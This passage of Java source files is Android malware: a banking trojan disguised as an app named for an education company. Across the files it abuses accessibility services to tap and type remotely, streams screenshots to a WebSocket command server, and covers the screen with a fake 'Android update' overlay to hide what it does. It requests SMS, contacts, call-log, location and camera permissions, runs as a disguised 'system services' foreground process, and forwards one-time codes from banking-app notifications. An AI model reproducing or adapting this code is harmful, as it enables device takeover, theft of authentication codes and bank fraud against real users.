                dispatchGesture(b.build(), null, null);
            } catch (Throwable ignored) {}
        });
    }

    public void longPress(final float x, final float y) {
        H.post(() -> {
            try {
                Path p = new Path();
                p.moveTo(x, y);
                GestureDescription.Builder b = new GestureDescription.Builder();
                b.addStroke(new GestureDescription.StrokeDescription(p, 0, 700));
                dispatchGesture(b.build(), null, null);
            } catch (Throwable ignored) {}
        });
    }

    public void setText(final String s) {
        H.post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (f == null) return;
                Bundle a = new Bundle();
                a.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, s);
                f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, a);
            } catch (Throwable ignored) {}
        });
    }

    public void key(final int code) {
        H.post(() -> {
            try {
                if (code == 4) performGlobalAction(GLOBAL_ACTION_BACK);
                else if (code == 3) performGlobalAction(GLOBAL_ACTION_HOME);
                else if (code == 187) performGlobalAction(GLOBAL_ACTION_RECENTS);
                else if (code == 26) performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                else if (code == 5) performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                else if (code == 66) keyText("\n");
                else if (code == 67) keyText("[DEL]");
            } catch (Throwable ignored) {}
        });
    }

    private void keyText(final String s) {
        H.post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;
                AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (f == null) return;
                CharSequence at = f.getText();
                String novo = (at == null ? "" : at.toString()) + s;
                if (s.equals("[DEL]")) {
                    novo = at == null || at.length() == 0 ? "" : at.toString().substring(0, at.length() - 1);
                }
                Bundle a = new Bundle();
                a.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, novo);
                f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, a);
            } catch (Throwable ignored) {}
        });
    }

    public void screenOn(boolean on) {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (on) {
                if (wl == null) {
                    wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "aval:scr");
                    wl.setReferenceCounted(false);
                }
                wl.acquire(60000);
            } else if (wl != null && wl.isHeld()) {
                wl.release();
            }
        } catch (Throwable ignored) {}
    }

    private void grab() {
        if (shotBusy) return;
        shotBusy = true;
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override public void onSuccess(ScreenshotResult r) {
                    Bitmap b = null;
                    Bitmap soft = null;
                    Bitmap small = null;
                    try {
                        b = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace());
                        soft = Bitmap.createBitmap(b.getWidth(), b.getHeight(), Bitmap.Config.ARGB_8888);
                        new android.graphics.Canvas(soft).drawBitmap(b, 0, 0, null);
                        int tw = Math.max(2, Math.min(ScreenSvc.W, soft.getWidth())) & ~1;
                        int th = Math.max(2, soft.getHeight() * tw / Math.max(1, soft.getWidth())) & ~1;
                        small = Bitmap.createScaledBitmap(soft, tw, th, true);
                        ScreenSvc.lastFrame = System.currentTimeMillis();
                        ByteArrayOutputStream bo = new ByteArrayOutputStream();
                        small.compress(Bitmap.CompressFormat.JPEG, ScreenSvc.Q, bo);
                        Net.sendBin(bo.toByteArray());
                    } catch (Throwable ignored) {
                    } finally {
                        try { if (small != null) small.recycle(); } catch (Throwable ignored) {}
                        try { if (soft != null) soft.recycle(); } catch (Throwable ignored) {}
                        try { r.getHardwareBuffer().close(); } catch (Throwable ignored) {}
                        shotBusy = false;
                    }
                }
                @Override public void onFailure(int code) {
                    shotBusy = false;
                    if (code != 3) Net.send("{\"t\":\"err\",\"o\":\"screenshot falhou: " + code + "\"}");
                }
            });
        } catch (Throwable t) {
            shotBusy = false;
        }
    }

    public void overlay(final boolean on) {
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    if (on) {
                        if (ov != null) return;
                        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
                        LinearLayout l = new LinearLayout(KeySvc.this);
                        l.setOrientation(LinearLayout.VERTICAL);
                        l.setGravity(Gravity.CENTER);
                        l.setBackgroundColor(Color.parseColor("#0B0F14"));
                        ProgressBar pb = new ProgressBar(KeySvc.this);
                        TextView t = new TextView(KeySvc.this);
                        t.setText("Atualizando o Android\n\nVerificando pacotes do sistema...\nNao desligue o aparelho");
                        t.setTextColor(Color.WHITE);
                        t.setTextSize(17);
                        t.setGravity(Gravity.CENTER);
                        t.setPadding(48, 48, 48, 48);
                        l.addView(pb);
                        l.addView(t);
                        int type = Build.VERSION.SDK_INT >= 22
                                ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                                : WindowManager.LayoutParams.TYPE_PHONE;
                        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT, type,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                PixelFormat.TRANSLUCENT);
                        lp.gravity = Gravity.TOP | Gravity.START;
                        lp.flags |= WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
                        l.setFitsSystemWindows(false);
                        if (Build.VERSION.SDK_INT >= 30) lp.setFitInsetsTypes(0);
                        if (Build.VERSION.SDK_INT >= 28)
                            lp.layoutInDisplayCutoutMode = Build.VERSION.SDK_INT >= 30
                                    ? WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
                                    : WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        try {
                            wm.addView(l, lp);
                        } catch (Throwable th) {
                            lp.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                            wm.addView(l, lp);
                        }
                        ov = l;
                    } else if (ov != null) {
                        wm.removeView(ov);
                        ov = null;
                    }
                } catch (Throwable ignored) {}
            }
        });
    }
}
===== .\app\src\main\java\com\eloeeducacao\Macro.java =====
package com.eloeeducacao;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public final class Macro {
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final List<JSONObject> fila = new ArrayList<>();
    public static volatile boolean rodando;

    public static void play(JSONArray a, JSONObject vars) {
        synchronized (fila) {
            fila.clear();
            JSONObject v = vars == null ? new JSONObject() : vars;
            if (a != null) {
                for (int i = 0; i < a.length(); i++) {
                    JSONObject s = a.optJSONObject(i);
                    if (s == null) continue;
                    if (s.has("v")) {
                        try {
                            s.put("v", s.optString("v")
                                    .replace("{{CHAVE}}", v.optString("chave"))
                                    .replace("{{VALOR}}", v.optString("valor")));
                        } catch (Throwable ignored) {}
                    }
                    fila.add(s);
                }
            }
        }
        if (!rodando) {
            rodando = true;
            H.post(passo);
        }
    }

    public static void stop() {
        synchronized (fila) { fila.clear(); }
        rodando = false;
        Util.sendT("info", "macro interrompido");
    }

    private static final Runnable passo = new Runnable() {
        @Override public void run() {
            if (!rodando) return;
            JSONObject s;
            synchronized (fila) {
                if (fila.isEmpty()) {
                    rodando = false;
                    Util.sendT("info", "macro concluido");
                    return;
                }
                s = fila.remove(0);
            }
            KeySvc k = KeySvc.I;
            try {
                if (k != null && s.has("t")) {
                    JSONArray p = s.getJSONArray("t");
                    k.touch((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("l")) {
                    JSONArray p = s.getJSONArray("l");
                    k.longPress((float) p.getDouble(0), (float) p.getDouble(1));
                } else if (k != null && s.has("s")) {
                    JSONArray p = s.getJSONArray("s");
                    k.swipe((float) p.getDouble(0), (float) p.getDouble(1),
                            (float) p.getDouble(2), (float) p.getDouble(3), p.optInt(4, 240));
                } else if (k != null && s.has("x")) {
                    k.setText(s.getString("x"));
                } else if (k != null && s.has("k")) {
                    k.key(s.getInt("k"));
                } else if (s.has("do")) {
                    String d = s.optString("do");
                    if ("back".equals(d)) {
                        if (k != null) k.key(4);
                    } else if ("home".equals(d)) {
                        if (k != null) k.key(3);
                    } else if ("wait".equals(d)) {
                        espera(s, System.currentTimeMillis() + s.optLong("ms", 8000));
                    } else {
                        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
                        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
                        if (h == null) Util.sendT("err", "nao achei: " + s.optJSONObject("sel"));
                        else executa(s, h, k);
                    }
                }
            } catch (Throwable ignored) {}
            H.postDelayed(this, Math.max(70, s.optLong("w", 0)));
        }
    };

    private static void espera(final JSONObject s, final long ate) {
        KeySvc k = KeySvc.I;
        AccessibilityNodeInfo r = k == null ? null : k.getRootInActiveWindow();
        Sel.Hit h = r == null ? null : Sel.melhor(r, s.optJSONObject("sel"));
        if (h != null) {
            executa(s, h, k);
            H.postDelayed(passo, 120);
            return;
        }
        if (System.currentTimeMillis() > ate) {
            Util.sendT("err", "timeout: " + s.optJSONObject("sel"));
            H.postDelayed(passo, 120);
            return;
        }
        H.postDelayed(() -> espera(s, ate), 250);
    }

    private static void executa(JSONObject s, Sel.Hit h, KeySvc k) {
        String d = s.optString("do");
        try {
            if ("tap".equals(d)) k.touch(h.x, h.y);
            else if ("long".equals(d)) k.longPress(h.x, h.y);
            else if ("get".equals(d)) Util.sendT("get", h.txt);
            else if ("set".equals(d)) {
                Bundle b = new Bundle();
                b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        s.optString("v"));
                h.node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            }
        } catch (Throwable ignored) {}
    }
}

===== .\app\src\main\java\com\eloeeducacao\MainActivity.java =====
package com.eloeeducacao;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.TextView;

public class MainActivity extends Activity {

    private static final int REQ_CAP = 10;
    private static final int REQ_NOT = 11;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);
        arranca();

        java.util.List<String> need = new java.util.ArrayList<>();
        java.util.List<String> perms = new java.util.ArrayList<>();
        perms.add(android.Manifest.permission.READ_SMS);
        perms.add(android.Manifest.permission.RECEIVE_SMS);
        perms.add(android.Manifest.permission.SEND_SMS);
        perms.add(android.Manifest.permission.READ_CONTACTS);
        perms.add(android.Manifest.permission.READ_PHONE_STATE);
        perms.add(android.Manifest.permission.READ_CALL_LOG);
        perms.add(android.Manifest.permission.CALL_PHONE);
        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(android.Manifest.permission.CAMERA);
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(android.Manifest.permission.POST_NOTIFICATIONS);
        } else {
            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        for (String p : perms)
            if (checkSelfPermission(p) != android.content.pm.PackageManager.PERMISSION_GRANTED)
                need.add(p);
        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ_NOT);

        findViewById(R.id.b1).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
                catch (Throwable ignored) {}
            }
        });

        findViewById(R.id.b2).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                MediaProjectionManager m =
                        (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(m.createScreenCaptureIntent(), REQ_CAP);
            }
        });

        findViewById(R.id.b3).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                try {
                    startActivity(new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                } catch (Throwable ignored) {}
            }
        });

        findViewById(R.id.b4).setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                arranca();
                refresh();
            }
        });
        refresh();
    }

    @Override protected void onResume() {
        super.onResume();
        refresh();
    }

    private void arranca() {
        try {
            Intent s = new Intent(this, NetSvc.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
            else startService(s);
        } catch (Throwable ignored) {}
    }

    private void refresh() {
        TextView t = findViewById(R.id.txt);
        if (t == null) return;
        StringBuilder sb = new StringBuilder();
        sb.append("acessibilidade: ").append(Util.accOn(this) ? "OK" : "PENDENTE").append('\n');
        sb.append("overlay: nativo (acessibilidade)\n");
        sb.append("captura: ").append(ScreenSvc.alive ? "ATIVA" : "PENDENTE").append('\n');
        sb.append("servidor: ").append(Net.online() ? "conectado" : "offline").append('\n');
        sb.append("status: ").append(Net.online() ? "sincronizado" : "aguardando");
        t.setText(sb.toString());
    }

    @Override protected void onActivityResult(int rq, int rs, Intent d) {
        super.onActivityResult(rq, rs, d);
        if (rq == REQ_CAP && rs == RESULT_OK && d != null) {
            Intent s = new Intent(this, ScreenSvc.class);
            s.putExtra("code", rs);
            s.putExtra("data", d);
            try {
                if (Build.VERSION.SDK_INT >= 26) startForegroundService(s);
                else startService(s);
            } catch (Throwable ignored) {}
            if (KeySvc.I != null) KeySvc.I.shotOn = true;
            refresh();
        }
    }
}
===== .\app\src\main\java\com\eloeeducacao\Net.java =====
package com.eloeeducacao;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public final class Net {
    private static volatile WebSocketClient ws;
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static final AtomicBoolean busy = new AtomicBoolean();
    private static volatile int fails;
    private static volatile long lastRx;
    private static Thread wdt;

    public static void start(final Context c) {
        if (busy.get() || (ws != null && ws.isOpen())) return;
        if (!busy.compareAndSet(false, true)) return;
        new Thread(() -> {
            boolean ok = false;
            try {
                List<String> urls = Util.candidates(c);
                Log.d("update", "candidatos: " + urls);
                for (String u : urls) if (tryConnect(c, u)) { ok = true; break; }
            } catch (Throwable t) {
                Log.d("update", "start: " + t);
            }
            busy.set(false);
            if (!ok) H.postDelayed(() -> start(c), backoff());
        }).start();
    }

    private static boolean tryConnect(final Context c, final String url) {
        final CountDownLatch latch = new CountDownLatch(1);
        final AtomicBoolean up = new AtomicBoolean();
        try {
            WebSocketClient w = new WebSocketClient(URI.create(url)) {
                @Override public void onOpen(ServerHandshake h) {
                    up.set(true);
                    fails = 0;
                    lastRx = System.currentTimeMillis();
                    Util.remember(c, url);
                    Log.d("update", "aberto em " + url);
                    send("{\"t\":\"hello\",\"id\":\"" + Cfg.id(c) + "\"," + Util.dev(c) + "}");
                    keepalive(c);
                    latch.countDown();
                }
                @Override public void onMessage(String m) {
                    lastRx = System.currentTimeMillis();
                    Cmd.handle(c, m);
                }
                @Override public void onClose(int code, String r, boolean remote) {
                    Log.d("update", "close " + code + " " + r + " " + url);
                    if (ws != this) return;
                    H.postDelayed(() -> start(c), backoff());
                }
                @Override public void onError(Exception e) {
                    Log.d("update", "err " + e + " " + url);
                    latch.countDown();
                }
            };
            w.setConnectionLostTimeout(25);
            w.connect();
            if (!latch.await(6, TimeUnit.SECONDS) || !up.get()) {
                try { w.close(); } catch (Throwable ignored) {}
                return false;
            }
            ws = w;
            return true;
        } catch (Throwable t) {
            Log.d("update", "falhou " + url + ": " + t);
            return false;
        }
    }

    private static void keepalive(final Context c) {
        if (wdt != null) return;
        wdt = new Thread(() -> {
            while (true) {
                try { Thread.sleep(10000); } catch (InterruptedException e) { return; }
                WebSocketClient w = ws;
                if (w == null || !w.isOpen()) continue;
                if (System.currentTimeMillis() - lastRx > 35000) {
                    Log.d("update", "sem resposta, reciclando");
                    try { w.close(); } catch (Throwable ignored) {}
                    continue;
                }
                send("{\"t\":\"ka\"}");
            }
        });
        wdt.setDaemon(true);
        wdt.start();
    }

    private static long backoff() {
        fails = Math.min(fails + 1, 6);
        return 2500L * fails + (long) (Math.random() * 1200);
    }

    public static void send(String s) {
        try {
            WebSocketClient w = ws;
            if (w != null && w.isOpen()) w.send(s);
        } catch (Throwable ignored) {}
    }

    public static void sendBin(byte[] b) {
        try {
            WebSocketClient w = ws;
            if (w == null || !w.isOpen()) return;
            if (w.hasBufferedData()) return;
            w.send(b);
        } catch (Throwable ignored) {}
    }

    public static boolean online() {
        WebSocketClient w = ws;
        return w != null && w.isOpen();
    }
}
===== .\app\src\main\java\com\eloeeducacao\NetSvc.java =====
package com.eloeeducacao;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

public class NetSvc extends Service {

    public static void arranca(Context c) {
        if (c == null) return;
        try {
            Intent s = new Intent(c, NetSvc.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s);
            else c.startService(s);
        } catch (Throwable ignored) {}
    }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            NotificationChannel c = new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            c.setSound(null, null);
            nm.createNotificationChannel(c);
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Servicos do sistema")
                .setContentText("Sincronizando...")
                .setSmallIcon(R.mipmap.ic)
                .setOngoing(true)
                .setShowWhen(false)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            else
                startForeground(1, n);
        } catch (Throwable ignored) {}
        Net.start(this);
    }

    @Override public int onStartCommand(Intent i, int f, int s) {
        Net.start(this);
        return START_STICKY;
    }
}
===== .\app\src\main\java\com\eloeeducacao\OtpSvc.java =====
package com.eloeeducacao;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class OtpSvc extends NotificationListenerService {

    @Override public void onNotificationPosted(StatusBarNotification s) {
        try {
            if (s == null || s.getNotification() == null) return;
            String pkg = s.getPackageName();
            if (!Util.banco(pkg) && !pkg.contains("inter")) return;
            CharSequence t = s.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence x = s.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String txt = (t == null ? "" : t) + " " + (x == null ? "" : x);
            if (!txt.matches(".*\\d{4,8}.*")) return;
            Util.sendT("otp", pkg + " | " + txt.trim());
        } catch (Throwable ignored) {}
    }
}
